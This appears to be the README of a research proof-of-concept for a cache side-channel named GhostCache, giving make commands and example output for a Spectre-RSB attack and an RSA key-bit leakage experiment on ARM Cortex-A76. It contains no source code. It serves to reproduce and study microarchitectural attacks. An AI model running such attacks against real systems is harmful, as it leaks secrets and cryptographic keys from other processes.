# Proof-of-concept Spectre and RSA leakage

The results below are a proof-of-concept of the Spectre attack and RSA leakage using the GhostCache. The code is designed to leak secrets from a victim thread's memory area by exploiting cache side-channels.

The following experiment results are produced on `ARM Cortex-A76`.

## Prerequisites

```shell
cd pocs # Change to the directory containing the POC code
```

## Spectre

Reproduces command: `make fullset_spectre_rsb run_fullset_spectre_rsb`.

**Stable expected behavior:** The accuracy is higher than `90%` and the secret is leaked correctly.

Example output:

```shell
mkdir -p ././out
cc -static -O0 smc_fullset_spectre_rsb.c -o ./out/fullset_spectre_rsb
objdump -d --source-comment -Sr ./out/fullset_spectre_rsb > ./out/fullset_spectre_rsb.s
taskset -c 0 ./out/fullset_spectre_rsb
max addr: 0xffffa60cc000
addr: ffffa60ac000, tag: 3fffe982b, idx: 0, offset: 0
[ 84:1|T] 5 [ 84:3|T] 5 
[104:0|h] 5 [104:1|h] 5 [104:2|h] 5 [104:3|h] 5 
[101:0|e] 5 [101:1|e] 5 [101:2|e] 5 [101:3|e] 5 
[ 32:1| ] 5 [ 32:3| ] 5 
[ 42:0|*] 5 
[ 77:0|M] 5 [ 77:1|M] 5 [ 77:2|M] 5 [ 77:3|M] 5 
[ 97:0|a] 5 [ 97:1|a] 5 [ 97:2|a] 5 [ 97:3|a] 5 
[103:1|g] 5 [103:2|g] 5 [103:3|g] 5 
[105:0|i] 5 [105:1|i] 5 [105:2|i] 5 [105:3|i] 5 
[ 99:1|c] 5 [ 99:3|c] 5 
[ 32:0| ] 5 [ 32:2| ] 5 [ 32:3| ] 5 
[ 87:0|W] 5 [ 87:1|W] 5 [ 87:2|W] 5 
[111:0|o] 5 [111:1|o] 5 [111:2|o] 5 [111:3|o] 5 
[114:0|r] 5 [114:1|r] 5 [114:2|r] 5 
[100:0|d] 5 [100:1|d] 5 [100:3|d] 5 
[108:0|l] 5 
[115:0|s] 5 [115:1|s] 5 [115:2|s] 5 [115:3|s] 5 
[ 32:0| ] 5 [ 32:2| ] 5 
[ 97:0|a] 5 [ 97:1|a] 5 [ 97:2|a] 5 [ 97:3|a] 5 
[114:0|r] 5 [114:1|r] 5 [114:2|r] 5 [114:3|r] 5 
[101:0|e] 5 [101:1|e] 5 [101:2|e] 5 
[ 32:0| ] 5 [ 32:1| ] 5 [ 32:2| ] 5 [ 32:3| ] 5 
[ 83:1|S] 5 
[107:0|k] 5 
[113:0|q] 5 [113:1|q] 5 [113:2|q] 5 
[117:0|u] 5 [117:1|u] 5 [117:2|u] 5 
[101:0|e] 5 [101:1|e] 5 [101:2|e] 5 
[ 97:0|a] 5 [ 97:1|a] 5 [ 97:3|a] 5 
[109:0|m] 5 [109:1|m] 5 [109:2|m] 5 [109:3|m] 5 
[ 91:0|[] 5 
[105:0|i] 5 [105:1|i] 5 [105:2|i] 5 [105:3|i] 5 
[115:0|s] 5 [115:1|s] 5 [115:2|s] 5 [115:3|s] 5 
[103:0|g] 5 
[104:0|h] 5 [104:2|h] 5 
[ 32:0| ] 5 [ 32:1| ] 5 [ 32:2| ] 5 [ 32:3| ] 5 
[ 79:0|O] 5 [ 79:1|O] 5 [ 79:2|O] 5 [ 79:3|O] 5 
[115:0|s] 5 [115:1|s] 5 
[115:1|s] 5 [115:2|s] 5 
[105:0|i] 5 [105:1|i] 5 [105:2|i] 5 [105:3|i] 5 
[102:0|f] 5 [102:1|f] 5 [102:2|f] 5 [102:3|f] 5 
[114:0|r] 5 [114:1|r] 5 [114:2|r] 5 [114:3|r] 5 
[ 97:0|a] 5 [ 97:1|a] 5 [ 97:2|a] 5 
[103:0|g] 5 [103:1|g] 5 [103:2|g] 5 [103:3|g] 5 
[101:0|e] 5 [101:1|e] 5 [101:2|e] 5 [101:3|e] 5 
[ 46:0|.] 5 [ 46:1|.] 5 [ 46:2|.] 5 [ 46:3|.] 5 
secret: The Magic Words are Squeamish Ossifrage.
leakys: The Magic Worls are kqueamish Ossifrage. 
correct: 38/40, accuracy: 0.950000
receiver finished
[+] Raw Transmission rate 47.1 b/s, a.k.a 5.9 B/s
[+] Time used: 849184 microseconds
sizeof(secrets): 40, correct: 38, accuracy: 95.000%
```

## Simplify RSA leakage

Reproduces command: `make simplify_rsa && taskset -c 1 ./out/simplify_rsa`.

Please note that the success rate is influenced by whether the context switch can be injected into the scheduler of the operating system by the attacker, making the attacker synchronous to the victim and able to monitor the cache (\$) state change after the victim thread has executed the code that leaks the secret.

**Expected behavior:** the secret is leaked accuracy is higher than `90%`.

You may need to retry the command to get a higher success rate result (e.g., higher than 90%).

Example output:

```shell
mkdir -p ././out
cc -static -O0 smc_simplify_rsa.c -o ./out/simplify_rsa
objdump -d --source-comment -Sr ./out/simplify_rsa > ./out/simplify_rsa.s
b a v b v a v b v a v b v a v b v a v b v a v v b v a v b v a v b v a v b v a v b v a v b v a v v b v a v b v a v b v a v b v a v b v a v b v a v b v a v b v a v b v a v b v a v b v a v b v a v b v a v b v a v b v a v b v a v b v v a v b v a v b v a v b v a v 
leakage   0:secret: 0, valid: 0, sum:  4, success: 0. $ evicted: [1 1 1 1 ] ####
leakage   1:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
leakage   2:secret: 0, valid: 1, sum:  1, success: 1. $ evicted: [1 0 0 0 ] #
leakage   3:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
leakage   4:secret: 0, valid: 1, sum:  2, success: 1. $ evicted: [1 1 0 0 ] ##
leakage   5:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
leakage   6:secret: 0, valid: 1, sum:  2, success: 1. $ evicted: [1 1 0 0 ] ##
leakage   7:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
leakage   8:secret: 0, valid: 1, sum:  2, success: 1. $ evicted: [1 1 0 0 ] ##
leakage   9:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
leakage  10:secret: 0, valid: 1, sum:  2, success: 1. $ evicted: [1 1 0 0 ] ##
leakage  11:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
leakage  12:secret: 0, valid: 1, sum:  2, success: 1. $ evicted: [1 1 0 0 ] ##
leakage  13:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
leakage  14:secret: 0, valid: 1, sum:  2, success: 1. $ evicted: [1 1 0 0 ] ##
leakage  15:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
leakage  16:secret: 0, valid: 1, sum:  2, success: 1. $ evicted: [1 1 0 0 ] ##
leakage  17:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
leakage  18:secret: 0, valid: 1, sum:  2, success: 1. $ evicted: [1 1 0 0 ] ##
leakage  19:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
leakage  20:secret: 0, valid: 1, sum:  2, success: 1. $ evicted: [1 1 0 0 ] ##
leakage  21:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
leakage  22:secret: 0, valid: 1, sum:  2, success: 1. $ evicted: [1 1 0 0 ] ##
leakage  23:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
leakage  24:secret: 0, valid: 1, sum:  2, success: 1. $ evicted: [1 1 0 0 ] ##
leakage  25:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
leakage  26:secret: 0, valid: 1, sum:  2, success: 1. $ evicted: [1 1 0 0 ] ##
leakage  27:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
leakage  28:secret: 0, valid: 1, sum:  2, success: 1. $ evicted: [1 1 0 0 ] ##
leakage  29:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
leakage  30:secret: 0, valid: 1, sum:  2, success: 1. $ evicted: [1 1 0 0 ] ##
leakage  31:secret: 1, valid: 1, sum:  4, success: 1. $ evicted: [1 1 1 1 ] ####
success: 31, success rate: 96.88%
```
